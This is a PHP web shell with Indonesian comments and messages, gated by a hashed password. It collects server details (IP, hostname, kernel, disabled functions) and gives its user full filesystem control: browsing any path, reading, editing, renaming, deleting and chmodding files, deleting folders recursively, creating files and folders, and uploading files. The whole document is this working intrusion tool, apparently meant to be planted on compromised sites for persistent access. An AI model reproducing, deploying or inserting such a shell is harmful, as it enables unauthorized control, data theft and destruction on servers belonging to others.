<?php

error_reporting(0);
$password = "e300145899842cd9e48219e5a2f041af";
session_start();

if(md5($_POST['password']) == $password) {
	$_SESSION['isLogin'] = true;
}else {
	loginShell();
}

function info() {
  $arr = [
    'ip' => $_SERVER['SERVER_ADDR'],
    'host' => gethostname(),
    'kernel' => php_uname(),
    'disablefunc' => ini_get('disable_functions'),
    'path' => getcwd(),
    'os' => PHP_OS,
  ];  

  return $arr;
} 
$getInfo = info();

if(strtoupper(substr($getInfo['os'], 0, 3)) == 'WIN') {
  $getInfo['os'] = 'Windows';
  $paths = explode('\\', $getInfo['path']);
  $paths = $paths[0] . '/';
}else if(strtoupper(substr($getInfo['os'], 0, 3)) == 'LIN') {
  $getInfo['os'] = 'Linux';
  $paths = '/';
}


$dir = getcwd();

if(isset($_GET['path'])) {
	$replace = str_replace('\\', '/', $_GET['path']);
	$replace = str_replace('//', '/', $_GET['path']);
	$pecah = explode('/', $replace);
}else {
	$replace = str_replace('\\', '/', $dir);
	$pecah = explode('/', $replace);
}

function loginShell() {
		if(!isset($_SESSION['isLogin'])) {
			echo "<form method='POST'><input type='password' name='password'><button type='submit'>Submit</button></form>";
			die();
		}
}

function cekPermission($filenya) {

  $perms = fileperms($filenya);
  switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = '-';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: 
        $info = 'u';
}

      //Untuk Owner
      $info .= (($perms & 0x0100) ? 'r' : '-');
      $info .= (($perms & 0x0080) ? 'w' : '-');
      $info .= (($perms & 0x0040) ?
                  (($perms & 0x0800) ? 's' : 'x' ) :
                  (($perms & 0x0800) ? 'S' : '-'));

      //Untuk Group
      $info .= (($perms & 0x0020) ? 'r' : '-');
      $info .= (($perms & 0x0010) ? 'w' : '-');
      $info .= (($perms & 0x0008) ?
                  (($perms & 0x0400) ? 's' : 'x' ) :
                  (($perms & 0x0400) ? 'S' : '-'));

      //Untuk Other
      $info .= (($perms & 0x0004) ? 'r' : '-');
      $info .= (($perms & 0x0002) ? 'w' : '-');
      $info .= (($perms & 0x0001) ?
                  (($perms & 0x0200) ? 't' : 'x' ) :
                  (($perms & 0x0200) ? 'T' : '-'));

      return $info;
}

function hitungSize($fileSize) {
	$bytes = sprintf('%u', filesize($fileSize));

    if ($bytes > 0)
    {
        $unit = intval(log($bytes, 1024));
        $units = array('B', 'KB', 'MB', 'GB');

        if (array_key_exists($unit, $units) === true)
        {
            return sprintf('%d %s', $bytes / pow(1024, $unit), $units[$unit]);
        }
    }

    return $bytes;
}

function bungkus($obj) {
	$wrap = filter_var(htmlspecialchars(file_get_contents($obj)), FILTER_SANITIZE_STRING);
	return $wrap;
}

function deleteFolder($dirnya) {
	$files = array_diff(scandir($dirnya), array('.', '..')); 

    foreach ($files as $file) { 
        (is_dir("$dirnya/$file")) ? deleteFolder("$dirnya/$file") : unlink("$dirnya/$file"); 
    }

    return rmdir($dirnya);
}

function folder_exist($folder)
{
    $path = realpath($folder);

    if($path !== false AND is_dir($path))
    {
        return true;
    }

    return false;
}


if(isset($_GET['path'])) {
	$get = $_GET['path'];
	$pec = explode('/', $get);

	if(is_file($get)) {
		$konten = bungkus($get);
		$cek = true;
		$listDir = scandir($get);
	}else {
		$listDir = array_diff(scandir($get), ['.', '..']);
	}
}else {	
	$get = $replace;
	$listDir = array_diff(scandir($get), ['.', '..']);
}

if(isset($_POST['pilihan'])) {
    switch ($_POST['pilihan']) {
        case 'edit':
            $edit = true;
            $dirFile = $_POST['dir'];
            $sourceFile = $_POST['sourceFile'];
            if(!empty($sourceFile)){
                $fileHandle = fopen($dirFile, 'w');
                if($fileHandle !== false){
                    if(fwrite($fileHandle, $sourceFile) !== false) {
                        fclose($fileHandle);
                        $successEdit = 'Berhasil di edit';
                    } else {
                        fclose($fileHandle);
                        $successEdit = 'Gagal edit';
                    }
                } else {
                    $successEdit = 'Gagal membuka file untuk diedit';
                }
            }
            break;
		case $_POST['pilihan'] == 'rename':
			$rename = true;
			$dirFile = $_POST['dir'];
			$filename = $_POST['namaFile'];
			$namaBaru = $_POST['namaBaru'];
			if(!empty($namaBaru)){
				if(rename($dirFile, $_GET['path'] . '/' . $namaBaru)) {
					$filename = $namaBaru;
					$dirFile = $_GET['path'] . '/' . $namaBaru;
					$successRename = 'Berhasil rename';
				}else {
					$successRename = 'Gagal rename';
				}
 			}
			break;
		case $_POST['pilihan'] == 'delete':
			$dirFile = $_POST['dir'];
			$type = $_POST['type'];
			if(isset($dirFile) && is_file($dirFile)) {
				if(unlink($dirFile)) {	
					$pesanHapus =  "<script>
									alert('File berhasil dihapus!!');
									window.location.href = window.location.href;
								    </script>";
				}else {
					$pesanHapus =  "<script>
									alert('File gagal dihapus!!');
									window.location.href = window.location.href;
								    </script>";
				}
			}else if(isset($dirFile) && is_dir($dirFile)) {
				//$dirFile = $dirFile . '/';
				if(deleteFolder($dirFile)) {
				    $pesanHapus =  "<script>
									alert('Folder berhasil dihapus!!');
									window.location.href = window.location.href;
								    </script>";
				}else {
					$pesanHapus =  "<script>
									alert('Folder gagal dihapus!!');
									window.location.href = window.location.href;
								    </script>";
				}
			}
			break;
		case $_POST['pilihan'] == 'chmod':
			$chmod = true;
			$file = fileperms($_POST['dir']);
			$permission = substr(sprintf('%o', $file), -4);
			$dirFile = $_POST['dir'];
			$perms = octdec($_POST['perms']);
			if(isset($_POST['perms'])) {
				if(isset($perms)) {
					if(chmod($dirFile, $perms)) {
						$permission = decoct($perms);
						$successChmod ='Berhasil chmod!';
					}else {
						$successChmod = 'Gagal chmod!';
					}
				}
			}
			break;
		case $_POST['pilihan'] == 'create':
			$namaFile = "";
			$isiFile = "";

			$dirPath = $_GET['path'] . '/';
			if(isset($_POST['createAction'])) {
				$namaFile = $_POST['createName'];
				$isiFile = ($_POST['createIsi'] == NULL) ? ' ' : $_POST['createIsi'];
				if(!file_exists($dirPath . $namaFile)) {
					if(file_put_contents($dirPath . $namaFile, $isiFile)) {
						$pesanCreate = 'File berhasil dibuat';
					}else {
						$pesanCreate = 'Directory not Writable';
					}
				}else {
					$pesanCreate = 'Nama file / folder sudah ada';
				}
			}
			break;
		case $_POST['pilihan'] == 'createFolder':
			$dirPath = $_GET['path'] . '/';
			if(isset($_POST['createFolder'])) {
				$namaFolder = $_POST['createName'];
				if(mkdir($dirPath . $namaFolder)) {
					$pesanCreate = 'Folder berhasil dibuat';
				}else {
					if(is_dir($namaFolder)) {
						$pesanCreate = 'Nama Folder / File sudah ada';
					}elseif(!is_writable($dirPath)){
						$pesanCreate = 'Directory not writable';
					}
				}
			}
			break;
		case $_POST['pilihan'] == 'upload':
			$path = $replace;
			if(isset($_GET['path'])) {
				$path = $_GET['path'];
			}

			if(isset($_FILES['uploadFile'])) {
				$namafile = $_FILES['uploadFile']['name'];
				$tempatfile = $_FILES['uploadFile']['tmp_name'];
				$error = $_FILES['uploadFile']['error'];
				$ukuranfile = $_FILES['uploadFile']['size'];

				if(move_uploaded_file($tempatfile, $path.'/'.$namafile)) {
					echo "<script>
						  alert('File berhasil diupload!!');
						  window.location.href = window.location.href;
						  </script>";
				}else {
					echo "<script>
						  alert('File gagal diupload!!');
						  window.location.href = window.location.href;
						  </script>";
				}
			}
			break;
	}
}



?>
